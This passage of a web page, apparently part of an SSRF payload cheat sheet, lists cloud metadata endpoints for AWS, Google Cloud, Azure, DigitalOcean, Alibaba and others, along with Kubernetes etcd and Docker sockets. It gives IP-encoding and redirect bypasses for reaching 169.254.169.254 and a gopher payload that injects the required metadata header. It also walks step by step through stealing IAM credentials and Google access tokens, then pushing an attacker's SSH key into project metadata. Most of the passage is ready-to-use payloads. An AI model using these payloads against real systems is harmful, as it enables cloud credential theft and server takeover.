+</span></span><span style="display:flex;"><span>User data (startup script <span style="color:#66d9ef">for</span> auto-scaling) <span style="color:#960050;background-color:#1e0010">:</span> /latest/user-data
+</span></span><span style="display:flex;"><span>Temporary AWS credentials <span style="color:#960050;background-color:#1e0010">:</span> /latest/meta-data/iam/security-credentials/
+</span></span></code></pre></div><p>DNS record</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//instance-data
+</span></span><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">169.254</span>.169.254
+</span></span><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">169.254</span>.169.254.nip.io/
+</span></span></code></pre></div><p>HTTP redirect</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Static<span style="color:#960050;background-color:#1e0010">:</span>http<span style="color:#960050;background-color:#1e0010">:</span>//nicob.net/redir6a
+</span></span><span style="display:flex;"><span>Dynamic<span style="color:#960050;background-color:#1e0010">:</span>http<span style="color:#960050;background-color:#1e0010">:</span>//nicob.net/redir-http-<span style="color:#ae81ff">169.254</span>.169.<span style="color:#ae81ff">254</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">80</span>-
+</span></span></code></pre></div><p>Alternate IP encoding</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">425.510</span>.425.<span style="color:#ae81ff">510</span>/ Dotted decimal with overflow
+</span></span><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">2852039166</span>/ Dotless decimal
+</span></span><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">7147006462</span>/ Dotless decimal with overflow
+</span></span><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//0xA9.0xFE.0xA9.0xFE/ Dotted hexadecimal
+</span></span><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//0xA9FEA9FE/ Dotless hexadecimal
+</span></span><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//0x41414141A9FEA9FE/ Dotless hexadecimal with overflow
+</span></span><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">0251.0376</span>.0251.<span style="color:#ae81ff">0376</span>/ Dotted octal
+</span></span><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">0251.00376</span>.000251.<span style="color:#ae81ff">0000376</span>/ Dotted octal with padding
+</span></span><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">0251.254</span>.169.254 Mixed encoding (dotted octal + dotted decimal)
+</span></span></code></pre></div><p>More urls to include</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">169.254</span>.169.<span style="color:#ae81ff">254</span>/latest/user-data
+</span></span><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">169.254</span>.169.<span style="color:#ae81ff">254</span>/latest/user-data/iam/security-credentials/[<span style="color:#66d9ef">ROLE NAME</span>]
+</span></span><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">169.254</span>.169.<span style="color:#ae81ff">254</span>/latest/meta-data/
+</span></span><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">169.254</span>.169.<span style="color:#ae81ff">254</span>/latest/meta-data/iam/security-credentials/[<span style="color:#66d9ef">ROLE NAME</span>]
+</span></span><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">169.254</span>.169.<span style="color:#ae81ff">254</span>/latest/meta-data/iam/security-credentials/PhotonInstance
+</span></span><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">169.254</span>.169.<span style="color:#ae81ff">254</span>/latest/meta-data/ami-id
+</span></span><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">169.254</span>.169.<span style="color:#ae81ff">254</span>/latest/meta-data/reservation-id
+</span></span><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">169.254</span>.169.<span style="color:#ae81ff">254</span>/latest/meta-data/hostname
+</span></span><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">169.254</span>.169.<span style="color:#ae81ff">254</span>/latest/meta-data/public-keys/
+</span></span><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">169.254</span>.169.<span style="color:#ae81ff">254</span>/latest/meta-data/public-keys/<span style="color:#ae81ff">0</span>/openssh-key
+</span></span><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">169.254</span>.169.<span style="color:#ae81ff">254</span>/latest/meta-data/public-keys/[<span style="color:#66d9ef">ID</span>]/openssh-key
+</span></span><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">169.254</span>.169.<span style="color:#ae81ff">254</span>/latest/meta-data/iam/security-credentials/dummy
+</span></span><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">169.254</span>.169.<span style="color:#ae81ff">254</span>/latest/meta-data/iam/security-credentials/s3access
+</span></span><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">169.254</span>.169.<span style="color:#ae81ff">254</span>/latest/dynamic/instance-identity/document
+</span></span></code></pre></div><p>AWS SSRF Bypasses</p>
+<pre tabindex="0"><code>Converted Decimal IP: http://2852039166/latest/meta-data/
+IPV6 Compressed: http://[::ffff:a9fe:a9fe]/latest/meta-data/
+IPV6 Expanded: http://[0:0:0:0:0:ffff:a9fe:a9fe]/latest/meta-data/
+IPV6/IPV4: http://[0:0:0:0:0:ffff:169.254.169.254]/latest/meta-data/
+</code></pre><p>E.g: Jira SSRF leading to AWS info disclosure - <code>https://help.redacted.com/plugins/servlet/oauth/users/icon-uri?consumerUri=http://169.254.169.254/metadata/v1/maintenance</code></p>
+<p>E.g2: Flaws challenge - <code>http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws/</code></p>
+<h3 id="ssrf-url-for-aws-ecs">
+  SSRF URL for AWS ECS
+  <a class="anchor" href="#ssrf-url-for-aws-ecs">#</a>
+</h3>
+<p>If you have an SSRF with file system access on an ECS instance, try extracting <code>/proc/self/environ</code> to get UUID.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>curl http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">169.254</span>.170.<span style="color:#ae81ff">2</span>/v2/credentials/&lt;UUID&gt;
+</span></span></code></pre></div><p>This way you&rsquo;ll extract IAM keys of the attached role</p>
+<h3 id="ssrf-url-for-aws-elastic-beanstalk">
+  SSRF URL for AWS Elastic Beanstalk
+  <a class="anchor" href="#ssrf-url-for-aws-elastic-beanstalk">#</a>
+</h3>
+<p>We retrieve the <code>accountId</code> and <code>region</code> from the API.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">169.254</span>.169.<span style="color:#ae81ff">254</span>/latest/dynamic/instance-identity/document
+</span></span><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">169.254</span>.169.<span style="color:#ae81ff">254</span>/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
+</span></span></code></pre></div><p>We then retrieve the <code>AccessKeyId</code>, <code>SecretAccessKey</code>, and <code>Token</code> from the API.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">169.254</span>.169.<span style="color:#ae81ff">254</span>/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
+</span></span></code></pre></div><p>
+  <img src="https://www.notsosecure.com/wp-content/uploads/2019/02/aws-cli.jpg" alt="notsosecureblog-awskey" /></p>
+<p>Then we use the credentials with <code>aws s3 ls s3://elasticbeanstalk-us-east-2-[ACCOUNT_ID]/</code>.</p>
+<h3 id="ssrf-url-for-aws-lambda">
+  SSRF URL for AWS Lambda
+  <a class="anchor" href="#ssrf-url-for-aws-lambda">#</a>
+</h3>
+<p>AWS Lambda provides an HTTP API for custom runtimes to receive invocation events from Lambda and send response data back within the Lambda execution environment.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//localhost<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">9001</span>/<span style="color:#ae81ff">2018</span>-<span style="color:#ae81ff">06</span>-<span style="color:#ae81ff">01</span>/runtime/invocation/next
+</span></span><span style="display:flex;"><span>$ curl <span style="color:#e6db74">&#34;http://</span>${AWS_LAMBDA_RUNTIME_API}<span style="color:#e6db74">/2018-06-01/runtime/invocation/next&#34;</span>
+</span></span></code></pre></div><p>Docs: 
+  <a href="https://docs.aws.amazon.com/lambda/latest/dg/runtimes-api.html#runtimes-api-next">https://docs.aws.amazon.com/lambda/latest/dg/runtimes-api.html#runtimes-api-next</a></p>
+<h3 id="ssrf-url-for-google-cloud">
+  SSRF URL for Google Cloud
+  <a class="anchor" href="#ssrf-url-for-google-cloud">#</a>
+</h3>
+<p>:warning: Google is shutting down support for usage of the <strong>v1 metadata service</strong> on January 15.</p>
+<p>Requires the header &ldquo;Metadata-Flavor: Google&rdquo; or &ldquo;X-Google-Metadata-Request: True&rdquo;</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">169.254</span>.169.<span style="color:#ae81ff">254</span>/computeMetadata/v1/
+</span></span><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//metadata.google.internal/computeMetadata/v1/
+</span></span><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//metadata/computeMetadata/v1/
+</span></span><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//metadata.google.internal/computeMetadata/v1/instance/hostname
+</span></span><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//metadata.google.internal/computeMetadata/v1/instance/id
+</span></span><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//metadata.google.internal/computeMetadata/v1/project/project-id
+</span></span></code></pre></div><p>Google allows recursive pulls</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//metadata.google.internal/computeMetadata/v1/instance/disks/<span style="color:#66d9ef">?</span>recursive=true
+</span></span></code></pre></div><p>Beta does NOT require a header atm (thanks Mathias Karlsson @avlidienbrunn)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//metadata.google.internal/computeMetadata/v1beta1/
+</span></span><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//metadata.google.internal/computeMetadata/v1beta1/<span style="color:#66d9ef">?</span>recursive=true
+</span></span></code></pre></div><p>Required headers can be set using a gopher SSRF with the following technique</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>gopher<span style="color:#960050;background-color:#1e0010">:</span>//metadata.google.internal<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">80</span>/xGET<span style="color:#66d9ef">%</span><span style="color:#ae81ff">20</span>/computeMetadata/v1/instance/attributes/ssh-keys<span style="color:#66d9ef">%</span>20HTTP<span style="color:#66d9ef">%</span><span style="color:#ae81ff">2f</span><span style="color:#66d9ef">%</span><span style="color:#ae81ff">31</span><span style="color:#66d9ef">%</span>2e<span style="color:#66d9ef">%</span><span style="color:#ae81ff">31</span><span style="color:#66d9ef">%</span>0AHost<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#66d9ef">%</span>20metadata.google.internal<span style="color:#66d9ef">%</span>0AAccept<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#66d9ef">%</span><span style="color:#ae81ff">20</span><span style="color:#66d9ef">%</span>2a<span style="color:#66d9ef">%</span><span style="color:#ae81ff">2f</span><span style="color:#66d9ef">%</span>2a<span style="color:#66d9ef">%</span>0aMetadata-Flavor:<span style="color:#66d9ef">%</span>20Google<span style="color:#66d9ef">%</span><span style="color:#ae81ff">0d</span><span style="color:#66d9ef">%</span>0a
+</span></span></code></pre></div><p>Interesting files to pull out:</p>
+<ul>
+<li>SSH Public Key : <code>http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json</code></li>
+<li>Get Access Token : <code>http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token</code></li>
+<li>Kubernetes Key : <code>http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env?alt=json</code></li>
+</ul>
+<h4 id="add-an-ssh-key">
+  Add an SSH key
+  <a class="anchor" href="#add-an-ssh-key">#</a>
+</h4>
+<p>Extract the token</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/<span style="color:#66d9ef">default</span>/token<span style="color:#66d9ef">?</span>alt=json
+</span></span></code></pre></div><p>Check the scope of the token</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>$ curl https<span style="color:#960050;background-color:#1e0010">:</span>//www.googleapis.com/oauth2/v1/tokeninfo<span style="color:#66d9ef">?</span>access_token=ya29.XXXXXKuXXXXXXXkGT0rJSA  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>{ 
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;issued_to&#34;</span><span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#e6db74">&#34;101302079XXXXX&#34;</span>, 
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;audience&#34;</span><span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#e6db74">&#34;10130207XXXXX&#34;</span>, 
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;scope&#34;</span><span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#e6db74">&#34;https://www.googleapis.com/auth/compute https://www.googleapis.com/auth/logging.write https://www.googleapis.com/auth/devstorage.read_write https://www.googleapis.com/auth/monitoring&#34;</span>, 
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;expires_in&#34;</span><span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#ae81ff">2443</span>, 
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;access_type&#34;</span><span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#e6db74">&#34;offline&#34;</span> 
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Now push the SSH key.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>curl -X POST <span style="color:#e6db74">&#34;https://www.googleapis.com/compute/v1/projects/1042377752888/setCommonInstanceMetadata&#34;</span> 
+</span></span><span style="display:flex;"><span>-H <span style="color:#e6db74">&#34;Authorization: Bearer ya29.c.EmKeBq9XI09_1HK1XXXXXXXXT0rJSA&#34;</span> 
+</span></span><span style="display:flex;"><span>-H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> 
+</span></span><span style="display:flex;"><span>--data <span style="color:#e6db74">&#39;{&#34;items&#34;: [{&#34;key&#34;: &#34;sshkeyname&#34;, &#34;value&#34;: &#34;sshkeyvalue&#34;}]}&#39;</span>
+</span></span></code></pre></div><h3 id="ssrf-url-for-digital-ocean">
+  SSRF URL for Digital Ocean
+  <a class="anchor" href="#ssrf-url-for-digital-ocean">#</a>
+</h3>
+<p>Documentation available at <code>https://developers.digitalocean.com/documentation/metadata/</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>curl http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">169.254</span>.169.<span style="color:#ae81ff">254</span>/metadata/v1/id
+</span></span><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">169.254</span>.169.<span style="color:#ae81ff">254</span>/metadata/v1.json
+</span></span><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">169.254</span>.169.<span style="color:#ae81ff">254</span>/metadata/v1/ 
+</span></span><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">169.254</span>.169.<span style="color:#ae81ff">254</span>/metadata/v1/id
+</span></span><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">169.254</span>.169.<span style="color:#ae81ff">254</span>/metadata/v1/user-data
+</span></span><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">169.254</span>.169.<span style="color:#ae81ff">254</span>/metadata/v1/hostname
+</span></span><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">169.254</span>.169.<span style="color:#ae81ff">254</span>/metadata/v1/region
+</span></span><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">169.254</span>.169.<span style="color:#ae81ff">254</span>/metadata/v1/interfaces/public/<span style="color:#ae81ff">0</span>/ipv6/address
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>All <span style="color:#66d9ef">in</span> one request<span style="color:#960050;background-color:#1e0010">:</span>
+</span></span><span style="display:flex;"><span>curl http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">169.254</span>.169.<span style="color:#ae81ff">254</span>/metadata/v1.json | jq
+</span></span></code></pre></div><h3 id="ssrf-url-for-packetcloud">
+  SSRF URL for Packetcloud
+  <a class="anchor" href="#ssrf-url-for-packetcloud">#</a>
+</h3>
+<p>Documentation available at <code>https://metadata.packet.net/userdata</code></p>
+<h3 id="ssrf-url-for-azure">
+  SSRF URL for Azure
+  <a class="anchor" href="#ssrf-url-for-azure">#</a>
+</h3>
+<p>Limited, maybe more exists? <code>https://azure.microsoft.com/en-us/blog/what-just-happened-to-my-vm-in-vm-metadata-service/</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">169.254</span>.169.<span style="color:#ae81ff">254</span>/metadata/v1/maintenance
+</span></span></code></pre></div><p>Update Apr 2017, Azure has more support; requires the header &ldquo;Metadata: true&rdquo; <code>https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">169.254</span>.169.<span style="color:#ae81ff">254</span>/metadata/instance<span style="color:#66d9ef">?</span>api-version=<span style="color:#ae81ff">2017</span>-<span style="color:#ae81ff">04</span>-<span style="color:#ae81ff">02</span>
+</span></span><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">169.254</span>.169.<span style="color:#ae81ff">254</span>/metadata/instance/network/interface/<span style="color:#ae81ff">0</span>/ipv4/ipAddress/<span style="color:#ae81ff">0</span>/publicIpAddress<span style="color:#66d9ef">?</span>api-version=<span style="color:#ae81ff">2017</span>-<span style="color:#ae81ff">04</span>-<span style="color:#ae81ff">02</span>&amp;format=text
+</span></span></code></pre></div><h3 id="ssrf-url-for-openstackrackspace">
+  SSRF URL for OpenStack/RackSpace
+  <a class="anchor" href="#ssrf-url-for-openstackrackspace">#</a>
+</h3>
+<p>(header required? unknown)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">169.254</span>.169.<span style="color:#ae81ff">254</span>/openstack
+</span></span></code></pre></div><h3 id="ssrf-url-for-hp-helion">
+  SSRF URL for HP Helion
+  <a class="anchor" href="#ssrf-url-for-hp-helion">#</a>
+</h3>
+<p>(header required? unknown)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">169.254</span>.169.<span style="color:#ae81ff">254</span>/<span style="color:#ae81ff">2009</span>-<span style="color:#ae81ff">04</span>-<span style="color:#ae81ff">04</span>/meta-data/ 
+</span></span></code></pre></div><h3 id="ssrf-url-for-oracle-cloud">
+  SSRF URL for Oracle Cloud
+  <a class="anchor" href="#ssrf-url-for-oracle-cloud">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">192.0</span>.0.<span style="color:#ae81ff">192</span>/latest/
+</span></span><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">192.0</span>.0.<span style="color:#ae81ff">192</span>/latest/user-data/
+</span></span><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">192.0</span>.0.<span style="color:#ae81ff">192</span>/latest/meta-data/
+</span></span><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">192.0</span>.0.<span style="color:#ae81ff">192</span>/latest/attributes/
+</span></span></code></pre></div><h3 id="ssrf-url-for-alibaba">
+  SSRF URL for Alibaba
+  <a class="anchor" href="#ssrf-url-for-alibaba">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">100.100</span>.100.<span style="color:#ae81ff">200</span>/latest/meta-data/
+</span></span><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">100.100</span>.100.<span style="color:#ae81ff">200</span>/latest/meta-data/instance-id
+</span></span><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">100.100</span>.100.<span style="color:#ae81ff">200</span>/latest/meta-data/image-id
+</span></span></code></pre></div><h3 id="ssrf-url-for-kubernetes-etcd">
+  SSRF URL for Kubernetes ETCD
+  <a class="anchor" href="#ssrf-url-for-kubernetes-etcd">#</a>
+</h3>
+<p>Can contain API keys and internal ip and ports</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>curl -L http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">127.0</span>.0.<span style="color:#ae81ff">1</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">2379</span>/version
+</span></span><span style="display:flex;"><span>curl http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">127.0</span>.0.<span style="color:#ae81ff">1</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">2379</span>/v2/keys/<span style="color:#66d9ef">?</span>recursive=true
+</span></span></code></pre></div><h3 id="ssrf-url-for-docker">
+  SSRF URL for Docker
+  <a class="anchor" href="#ssrf-url-for-docker">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">127.0</span>.0.<span style="color:#ae81ff">1</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">2375</span>/v1.<span style="color:#ae81ff">24</span>/containers/json
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Simple example
+</span></span><span style="display:flex;"><span>docker run -ti -v /var/run/docker.sock<span style="color:#960050;background-color:#1e0010">:</span>/var/run/docker.sock bash
+</span></span><span style="display:flex;"><span>bash-<span style="color:#ae81ff">4.4</span><span style="color:#75715e"># curl --unix-socket /var/run/docker.sock http://foo/containers/json</span>
+</span></span><span style="display:flex;"><span>bash-<span style="color:#ae81ff">4.4</span><span style="color:#75715e"># curl --unix-socket /var/run/docker.sock http://foo/images/json</span>
+</span></span></code></pre></div><p>More info:</p>
+<ul>
+<li>Daemon socket option: 
+  <a href="https://docs.docker.com/engine/reference/commandline/dockerd/#daemon-socket-option">https://docs.docker.com/engine/reference/commandline/dockerd/#daemon-socket-option</a></li>
+<li>Docker Engine API: 
+  <a href="https://docs.docker.com/engine/api/latest/">https://docs.docker.com/engine/api/latest/</a></li>
+</ul>
+<h3 id="ssrf-url-for-rancher">
+  SSRF URL for Rancher
+  <a class="anchor" href="#ssrf-url-for-rancher">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>curl http<span style="color:#960050;background-color:#1e0010">:</span>//rancher-metadata/&lt;version&gt;/&lt;path&gt;
+</span></span></code></pre></div><p>More info: 
+  <a href="https://rancher.com/docs/rancher/v1.6/en/rancher-services/metadata-service/">https://rancher.com/docs/rancher/v1.6/en/rancher-services/metadata-service/</a></p>
+<h2 id="references">
+  References
+  <a class="anchor" href="#references">#</a>
+</h2>
+<ul>
+<li>
+  <a href="https://www.agarri.fr/docs/AppSecEU15-Server_side_browsing_considered_harmful.pdf">AppSecEU15-Server_side_browsing_considered_harmful.pdf</a></li>
+<li>
+  <a href="https://hawkinsecurity.com/2017/12/13/extracting-aws-metadata-via-ssrf-in-google-acquisition/">Extracting AWS metadata via SSRF in Google Acquisition - tghawkins - 2017-12-13</a></li>
+<li>
+  <a href="http://buer.haus/2016/04/18/esea-server-side-request-forgery-and-querying-aws-meta-data/">ESEA Server-Side Request Forgery and Querying AWS Meta Data</a> by Brett Buerhaus</li>
+<li>
+  <a href="https://hackerone.com/reports/115857">SSRF and local file read in video to gif converter</a></li>
+<li>
